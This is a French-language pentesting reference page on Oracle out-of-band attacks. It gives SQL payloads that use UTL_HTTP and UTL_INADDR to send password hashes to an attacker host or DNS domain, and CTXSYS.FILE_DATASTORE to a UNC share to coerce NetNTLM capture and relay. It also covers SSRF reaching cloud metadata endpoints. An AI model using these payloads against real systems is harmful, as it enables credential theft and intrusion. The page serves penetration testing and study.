---
title: "Oracle hors bande : SSRF, capture d'empreintes et exfiltration"
description: "Faire ouvrir à Oracle des connexions sortantes via UTL_HTTP, UTL_TCP et DBMS_LDAP pour du server-side request forgery, capturer le NTLM du compte de service via un rappel UNC ou HTTP sous Windows, et exfiltrer des données hors bande lorsque la sortie directe est aveugle."
keywords:
  - UTL_HTTP
  - UTL_TCP
  - DBMS_LDAP
  - Oracle SSRF
  - out-of-band
---

# Hors bande

Oracle peut être amené à **initier des connexions sortantes**, ce qui transforme une session de base de données (ou une injection en aveugle) en **server-side request forgery**, en une primitive de **capture d'identifiants** sous Windows, et en un canal d'**exfiltration** lorsque vous ne pouvez pas lire la sortie des requêtes directement. La connexion sortante est effectuée par le compte de service Oracle, donc elle atteint des services internes que l'attaquant ne peut pas atteindre.

## Paquets sortants

```sql
-- HTTP callout: SSRF to internal services, or exfiltrate data in the URL
SELECT UTL_HTTP.REQUEST('http://<attacker>/'||(SELECT password FROM sys.user$ WHERE rownum=1)) FROM dual;

-- raw TCP to an internal host/port (service reach and banner grab)
-- UTL_TCP.OPEN_CONNECTION(host, port) ...

-- LDAP bind to an attacker or internal directory
-- DBMS_LDAP.INIT('<host>', 389) ...

-- DNS-based blind exfiltration and interaction
SELECT UTL_INADDR.GET_HOST_ADDRESS('<data>.<attacker-dns>') FROM dual;
```

## Capture d'empreintes sous Windows

Sous Oracle Windows, les paquets sortants génériques ci-dessus ne **transmettent pas** les identifiants du compte de service. La coercition qui fonctionne est un **index de contexte texte** dont le datastore est un chemin UNC : pointez une préférence `CTXSYS.FILE_DATASTORE` vers un partage SMB de l'attaquant et construisez un index avec elle, et Oracle accède au partage et s'authentifie, vous remettant le NetNTLM du compte de service à [capturer](../../directory/active-directory/authentication/ntlm/net-ntlm-capture-and-poisoning.md) ou à [relayer](../../directory/active-directory/authentication/ntlm/relay.md).

```sql
EXEC CTX_DDL.CREATE_PREFERENCE('p','FILE_DATASTORE');
EXEC CTX_DDL.SET_ATTRIBUTE('p','PATH','\\<attacker>\share');
CREATE INDEX ix ON t(c) INDEXTYPE IS CTXSYS.CONTEXT PARAMETERS('datastore p');
```

## Notes d'exploitation

- Depuis la 11g, les paquets réseau sont encadrés par des **ACL réseau** (`DBMS_NETWORK_ACL_ADMIN`), donc le trafic sortant nécessite une ACE accordée pour votre hôte cible. `DBMS_CLOUD.SEND_REQUEST` (19c/23c) est une autre voie sortante, mais elle passe par `UTL_HTTP` et nécessite aussi ses propres ACE, donc ce n'est pas un contournement d'ACL.
- La **SSRF** depuis la base de données atteint les endpoints de métadonnées cloud et les services internes uniquement, ce qui est de grande valeur dans un Oracle hébergé dans le cloud.
- L'**exfiltration hors bande** (DNS ou HTTP) est le moyen d'extraire des données d'une injection en **aveugle** où aucune ligne ne vous est renvoyée.
- Sous Windows, l'angle de capture d'empreintes fait d'Oracle une source de relais Active Directory, et pas seulement une cible de données, donc associez-le à `ntlmrelayx`.

## Outils

- **sqlplus / point d'injection** : émettre les appels `UTL_HTTP`/`UTL_TCP`/`DBMS_LDAP`/`UTL_INADDR`.
- **ODAT** : automatise la capture d'authentification SMB via `CTXSYS.FILE_DATASTORE` sous Oracle Windows.
- **Responder / ntlmrelayx.py** : capturer ou relayer l'authentification coercée du compte de service.
- **Burp Collaborator / interactsh** : détecter les interactions HTTP et DNS hors bande.

## Références

- [HackTricks: Oracle injection, out-of-band](https://hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/index.html)
- [ibreak.software: using SQL injection to perform SSRF/XSPA attacks](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)
- [Oracle: UTL_HTTP package](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html)
